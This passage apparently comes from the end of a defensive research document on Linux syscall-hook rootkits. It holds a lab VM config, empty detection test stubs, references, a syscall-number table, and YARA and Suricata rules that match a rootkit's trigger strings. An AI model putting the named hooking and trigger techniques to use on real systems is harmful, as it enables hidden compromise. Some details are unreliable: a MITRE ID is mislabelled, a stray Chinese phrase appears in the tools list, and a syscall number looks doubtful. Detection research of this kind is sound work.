| Persistent kernel config | Modules loaded at boot | `/etc/modprobe.d/`, initramfs |
| Hidden files | Rootkit components | Forensic filesystem analysis |

---

## 12. Testing Methodology

### 12.1 Controlled Environment Setup

```yaml
# test_environment.yml
environment:
  name: "syscall_hook_lab"
  type: "isolated_vm"
  
  vm_config:
    os: "Ubuntu 22.04 LTS"
    kernel: "5.15.0-generic"  # Deliberately older for testing
    memory: "4GB"
    cpus: 2
    
  network:
    type: "isolated"
    allow_outbound:
      - "10.0.0.0/8"  # Lab network only
    
  instrumentation:
    - qemu_debug: true
    - gdb: "tcp::1234"
    - kcov: true
    
  monitoring:
    - ebpf_tracing: true
    - syscall_audit: true
    - memory_integrity: "continuous"
```

### 12.2 Test Cases

```python
# test_syscall_hook.py

class TestSyscallHookDetection:
    """
    Test suite for syscall hook detection mechanisms
    """
    
    def test_basic_hook_detection(self):
        """Verify basic hook installation is detected"""
        # 1. Load test hook module
        # 2. Run detection tool
        # 3. Assert detection occurred
        pass
    
    def test_cr0_monitoring(self):
        """Verify CR0 WP bit changes are logged"""
        # 1. Install kprobe on write_cr0
        # 2. Trigger hook installation
        # 3. Check trace buffer for alert
        pass
    
    def test_memory_integrity_check(self):
        """Verify periodic integrity checks catch hooks"""
        # 1. Install hook
        # 2. Wait for integrity check cycle
        # 3. Verify alert generated
        pass
    
    def test_evasion_detection(self):
        """Verify evasion techniques are detected or blocked"""
        evasion_techniques = [
            "inline_hook",
            "kprobe_hook", 
            "vfs_level_hook",
            "ftrace_hook",
            "bpf_trampoline_hook"
        ]
        for technique in evasion_techniques:
            with self.subTest(technique=technique):
                # Test each evasion method
                pass
    
    def test_magic_sequence_trigger(self):
        """Verify magic sequence detection in data flow"""
        # 1. Set up HTTPS server
        # 2. Send normal traffic - verify passes
        # 3. Send traffic with magic - verify intercepted
        # 4. Verify payload triggered
        pass
```

---

## 13. References

### Academic Papers
1. "Subverting the Linux Kernel: A Brief Overview of Rootkits" - SAMI Conference
2. "Defending Against Kernel-Level Rootkits" - USENIX Security
3. "Runtime Detection of Kernel-Level Rootkits" - IEEE S&P

### Documentation
1. Linux Kernel Documentation: `Documentation/security/`
2. MITRE ATT&CK: T1014 (Rootkit), T1179 (Intercepting Web Traffic)
3. OWASP: "Kernel Module Rootkits"

### Tools
1. **Detection**: rkhunter, chkrootkit, Lynis, OSSEC
2. **Analysis**: Volatility, LiME,批量内存取证
3. **Monitoring**: eBPF tools (bcc, libbpf), auditd
4. **Testing**: QEMU + GDB, syzkaller, kAFL

---

## Appendix A: System Call Numbers Reference

| Architecture | read | write | recvfrom | readv |
|--------------|------|-------|----------|-------|
| x86_64 | 0 | 1 | 62 | 65 |
| x86 (32-bit) | 3 | 4 | 292 | 145 |
| ARM64 | 63 | 64 | 207 | 65 |
| ARM (32-bit) | 3 | 4 | 292 | 145 |
| RISC-V | 63 | 64 | 207 | 65 |

---

## Appendix B: Magic Sequence Examples (For Detection Rules)

```
# YARA rule for magic sequence in memory dumps
rule SyscallHook_Magic_LABRA {
    strings:
        $magic1 = { 7F 4C 41 42 52 41 00 00 00 00 00 00 00 00 00 00 }
        $magic2 = "X-Magic: TRIGGER" ascii
        $magic3 = { 13 37 DE AD BE EF 00 00 }
    condition:
        any of them
}

# Suricata rule for network detection
alert tls any any -> any any (msg:"Possible rootkit trigger in TLS"; 
    tls.cert_subject; content:"TRIGGER"; nocase;
    reference:url,MITRE-ATT&CK-T1179;
    classtype:trojan-activity; sid:1000001; rev:1;)
```

---

*Document Version: 1.0*  
*Classification: Defensive Security Research*  
*Intended Audience: Security Engineers, Detection Developers, Kernel Developers*
